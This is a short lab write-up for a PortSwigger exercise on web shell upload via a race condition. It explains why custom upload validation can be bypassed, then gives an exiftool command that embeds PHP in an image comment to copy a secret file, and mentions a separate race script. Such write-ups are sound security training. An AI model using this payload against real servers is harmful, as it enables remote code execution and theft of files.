# Web shell upload via race condition

[Lab in PortSwigger](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

## Definition
Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.

That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions that enable an attacker to completely bypass even the most robust validation.

For example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.

These vulnerabilities are often extremely subtle, making them difficult to detect during blackbox testing unless you can find a way to leak the relevant source code. 

## Notes
1. Craft a image file with a embedded PHP malicious code in comment section:
```bash
exiftool -Comment="<?php copy('/home/carlos/secret', 'secret.txt'); ?>" avatar.png -o avatar.php
```
2. Run the malicious [python script](exploit.py) to monitory the file upload request

3. Do the upload

## Key Words
> file upload, web shell, race condition, rce